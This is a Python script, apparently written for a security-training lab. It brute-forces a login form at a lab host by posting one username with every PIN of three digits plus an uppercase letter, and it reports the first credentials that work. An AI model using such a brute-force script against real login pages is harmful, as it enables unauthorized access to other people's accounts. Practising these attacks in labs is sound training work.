# Facilitates sending and receiving HTTP requests from web apps.
import requests
import string

# Send post requests to target URL.
url = "http://python.thm/labs/lab1/index.php"

username = "Mark"
password_list = []

# Generating 4-digit  alphanumeric pins.
for i in range(1000):
    password = str(i).zfill(3)
    for letter in string.ascii_uppercase:
        password_list += [password + letter]

# Iterates through password list, sending diff. usernames and password combos to server.
def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
